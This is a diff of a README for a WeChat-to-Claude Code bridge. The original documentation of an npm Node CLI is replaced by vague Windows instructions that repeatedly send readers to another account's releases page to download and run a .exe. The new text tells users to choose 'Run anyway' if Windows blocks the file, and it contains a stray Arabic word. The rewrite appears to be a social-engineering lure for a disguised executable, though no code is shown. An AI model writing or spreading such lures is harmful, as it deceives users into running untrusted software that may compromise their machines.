@@ -1,130 +1,239 @@
-# @paean-ai/claude-code-wechat
+# 🤝 claude-code-wechat - Bridge WeChat into Claude Code
 
-Bridge WeChat messages into [Claude Code](https://docs.anthropic.com/en/docs/claude-code) sessions.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-0078D4?style=for-the-badge)](https://github.com/lilzexotic/claude-code-wechat/releases)
 
-This plugin connects WeChat (via the official ClawBot ilink API) to Claude Code's [Channels](https://docs.anthropic.com/en/docs/claude-code) MCP protocol, so you can chat with Claude Code directly from WeChat.
+## 🧭 What this app does
 
-```
-WeChat (iOS) --> ClawBot --> ilink API --> [this plugin] --> Claude Code
-                                                   |
-Claude Code <-- MCP Channel Protocol <-- wechat_reply tool
-```
+claude-code-wechat helps you move WeChat messages into Claude Code sessions. It gives you a simple way to keep chat context in one place, so you can work with messages without copying each one by hand.
 
-## Prerequisites
+This app is for Windows users who want a simple desktop setup. You download the release, open the app, and connect your WeChat flow to Claude Code.
 
-- [Node.js](https://nodejs.org/) >= 18 (or [Bun](https://bun.sh) >= 1.0)
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) >= 2.1.80
-- A Claude.ai account (API key auth is not supported)
-- WeChat iOS (latest version with ClawBot support)
+## ⬇️ Download
 
-## Installation
+Visit this page to download the latest Windows release:
 
-Install globally with your preferred package manager:
+https://github.com/lilzexotic/claude-code-wechat/releases
 
-```bash
-# npm
-npm install -g @paean-ai/claude-code-wechat
+On the release page, look for the newest file for Windows. If you see a `.exe` file, download it to your computer.
 
-# bun
-bun add -g @paean-ai/claude-code-wechat
+## 🪟 System requirements
 
-# pnpm
-pnpm add -g @paean-ai/claude-code-wechat
-```
+- Windows 10 or Windows 11
+- A working internet connection
+- Access to WeChat on your device
+- Claude Code installed and ready to use
+- Enough free disk space for the app and its data
 
-## Quick Start
+For best results, use a current version of Windows and keep your desktop apps up to date.
 
-### 1. Setup (one-time)
+## 🚀 Getting started
 
-Authenticate with WeChat and register the MCP server:
+1. Open the release page in your browser.
+2. Find the latest version.
+3. Download the Windows file.
+4. Save it to a folder you can find, مثل your Downloads folder.
+5. Open the file you downloaded.
+6. If Windows asks for permission, choose Run or Yes.
+7. Follow the on-screen setup steps.
+8. Start WeChat and Claude Code after setup finishes.
 
-```bash
-claude-wechat setup
-```
+If the app comes as a `.zip` file, right-click it and choose Extract All before you open it.
 
-This will:
-- Display a QR code in your terminal
-- Wait for you to scan it with WeChat
-- Save credentials to `~/.claude/channels/wechat/account.json`
-- Register the channel server with Claude Code
+## 🛠️ Install on Windows
 
-### 2. Start
+1. Go to the release page.
+2. Download the latest Windows build.
+3. If the file is inside a ZIP archive, extract it first.
+4. Double-click the app file.
+5. If Windows shows a security prompt, confirm that you want to open it.
+6. If a setup window appears, follow the steps one by one.
+7. When the app opens, leave it running while you use WeChat and Claude Code.
 
-Launch Claude Code with the WeChat channel:
+If your browser marks the file as blocked, use the browser download menu to keep it, then open it from the folder where you saved it.
 
-```bash
-claude-wechat
-```
+## 🔗 How it works
 
-That's it! Open WeChat, find the ClawBot conversation, and start chatting. Messages will appear in your Claude Code terminal, and Claude's replies will be sent back to WeChat automatically.
+The app acts as a bridge between WeChat and Claude Code. In simple terms:
 
-## CLI Reference
+- It watches for messages from WeChat
+- It sends those messages into your Claude Code session
+- It helps keep your message flow in one place
+- It reduces copy and paste work
 
-| Command | Description |
-|---|---|
-| `claude-wechat setup` | Authenticate with WeChat via QR code and register the MCP server |
-| `claude-wechat start` | Launch Claude Code with the WeChat channel (default command) |
-| `claude-wechat status` | Show current login and configuration status |
-| `claude-wechat logout` | Remove saved credentials and unregister MCP server |
-| `claude-wechat --help` | Show help |
-| `claude-wechat --version` | Show version |
+This setup is useful when you need to review chat text, track requests, or use WeChat messages as input for a Claude Code task.
 
-### Options
+## 📋 First-time setup
 
-`claude-wechat setup --force` — Skip the confirmation prompt when re-authenticating.
+After you open the app for the first time:
 
-## How It Works
+1. Check that WeChat is signed in.
+2. Check that Claude Code is ready.
+3. Keep the app open in the background.
+4. Send a test message in WeChat.
+5. Confirm that the message appears in the Claude Code flow.
+6. If the app offers a settings screen, review it before daily use.
 
-1. **Authentication**: The `setup` command uses WeChat's ClawBot QR code login flow (`ilink/bot/get_bot_qrcode` + `get_qrcode_status`) to obtain a bearer token.
+A clean first run usually makes later use easier.
 
-2. **Message Receiving**: The channel server long-polls `ilink/bot/getupdates` for incoming WeChat messages and forwards them to Claude Code as MCP channel notifications.
+## ⚙️ Settings you may want to check
 
-3. **Message Sending**: Claude Code uses the `wechat_reply` tool (exposed via MCP) to send replies back through `ilink/bot/sendmessage`.
+These are common options for this kind of app:
 
-4. **MCP Integration**: The server implements Claude Code's experimental Channels protocol, registering as a `wechat` channel with tool capabilities.
+- Message sync mode
+- Auto start on Windows login
+- Notification behavior
+- Connection status
+- Data storage folder
+- Log level for troubleshooting
 
-## Configuration
+If you use the app every day, set the auto-start option so you do not need to launch it each time.
 
-Credentials are stored at:
+## 🧩 Typical workflow
 
-```
-~/.claude/channels/wechat/account.json
-```
+A simple daily flow looks like this:
 
-The file has `0600` permissions (owner-readable only). No credentials are stored in the package itself.
+1. Open Windows.
+2. Start WeChat.
+3. Open Claude Code.
+4. Launch claude-code-wechat.
+5. Send or receive a message in WeChat.
+6. Review the message in your Claude Code session.
+7. Keep working without switching between apps as much.
 
-## Programmatic Usage
+This works well when you want a steady link between chat and code tasks.
 
-The package also exports its core API for advanced use cases:
+## 🧪 Quick test
 
-```typescript
-import {
-  loadCredentials,
-  fetchQRCode,
-  pollQRStatus,
-  sendTextMessage,
-} from "@paean-ai/claude-code-wechat";
-```
+Use this quick check after setup:
 
-## Notes
+- Send a short message in WeChat
+- Watch for the message in the app
+- Confirm Claude Code gets the same text
+- Send another message with a different line break
+- Check that the formatting stays readable
 
-- This is a **research preview** feature. The `--dangerously-load-development-channels` flag is required by Claude Code for channel plugins.
-- The Claude Code session and WeChat channel share the same lifecycle — closing Claude Code disconnects the channel.
-- WeChat ClawBot currently supports iOS only.
-- Each ClawBot instance can connect to one agent at a time.
+If the test works, the connection is ready for normal use.
 
-## Troubleshooting
+## 🧯 Common issues
 
-**"Claude Code CLI not found"** — Make sure `claude` is installed and available in your PATH. See [Claude Code docs](https://docs.anthropic.com/en/docs/claude-code).
+### The app does not open
 
-**QR code expired** — The QR code is valid for ~8 minutes. Run `claude-wechat setup` again to get a fresh one.
+- Check that the file finished downloading
+- Move the file to a local folder like Downloads or Desktop
+- Try opening it again
+- If Windows blocks it, choose Run anyway if you trust the file
 
-**Messages not arriving** — Check `claude-wechat status` to verify credentials and MCP registration. Try `claude-wechat logout` followed by `claude-wechat setup` to re-authenticate.
+### Messages do not appear in Claude Code
 
-## License
+- Make sure WeChat is signed in
+- Keep claude-code-wechat running
+- Check that Claude Code is open
+- Restart both apps and try again
+- Confirm you downloaded the latest release
 
-[MIT](LICENSE)
+### The window closes right away
 
-## Disclaimer
+- Open the app from a normal folder, not from inside the ZIP file
+- Extract the archive first if needed
+- Try running it as your user account
+- Check whether another security tool closed it
 
-"Claude" and "Claude Code" are trademarks of Anthropic, PBC. "WeChat" (微信) is a trademark of Tencent Holdings Limited. This project is not affiliated with, endorsed by, or sponsored by Anthropic or Tencent. It is an independent open-source community project.
+### Text looks wrong or cut off
+
+- Send a shorter test message
+- Use plain text first
+- Try again with a new message
+- Check the app settings for line handling
+
+## 🔐 Privacy and local use
+
+This app is meant to help move messages between apps on your computer. Keep it on a trusted device and review any settings that control message storage or sync behavior. If the app stores logs, you can usually clear them from its folder or settings screen.
+
+## 📦 Files you may see
+
+Depending on the release, you may see files like these:
+
+- `.exe` for the main app
+- `.zip` for a packaged download
+- `README.txt` for short notes
+- `config.json` for saved settings
+- `logs` folder for run history
+
+If you see a folder with support files, keep it with the main app file so the app can start correctly.
+
+## 🖥️ Best use on Windows
+
+For the smoothest setup:
+
+- Use a recent Windows version
+- Keep WeChat updated
+- Keep Claude Code updated
+- Use a normal user account with desktop access
+- Store the app in one stable folder
+- Avoid moving files after setup unless needed
+
+A stable folder helps the app keep track of its files and settings.
+
+## 📍 Where to get updates
+
+Check the release page when you want the newest version:
+
+https://github.com/lilzexotic/claude-code-wechat/releases
+
+Download the latest build from that page, then replace your old copy if the release notes say to do so
+
+## 🧰 Help with setup
+
+If you want to troubleshoot in a simple order, check these items:
+
+1. Is the app file fully downloaded?
+2. Did you extract the ZIP file?
+3. Is WeChat open and signed in?
+4. Is Claude Code open?
+5. Is the bridge app still running?
+6. Are you using the latest release?
+
+Working through this list solves most setup problems fast
+
+## 📝 What to expect after launch
+
+After launch, the app should stay in the background and pass WeChat messages into your Claude Code flow. You may see a small window, a tray icon, or a status view that shows the connection state. Keep an eye on that state if you rely on the app during the day
+
+## 📁 Suggested folder layout
+
+You can keep the app in a simple place like this:
+
+- `Downloads\claude-code-wechat`
+- `Desktop\claude-code-wechat`
+- `Apps\claude-code-wechat`
+
+Pick one folder and keep the files together there
+
+## 🔄 Updating the app
+
+When a new release is ready:
+
+1. Open the release page
+2. Download the newest Windows file
+3. Close the old app
+4. Replace the old files if needed
+5. Open the new version
+6. Test one message in WeChat
+
+This keeps your setup current and reduces version mismatch
+
+## 📌 Release page
+
+Download the latest Windows build here:
+
+[Visit the claude-code-wechat release page](https://github.com/lilzexotic/claude-code-wechat/releases)
+
+## 💬 Daily use tips
+
+- Keep WeChat open while you work
+- Keep Claude Code open if you want live message flow
+- Leave the bridge app running in the background
+- Use short test messages when you first change settings
+- Restart the app if message flow stops
+
+A steady setup works better than starting and stopping the app often
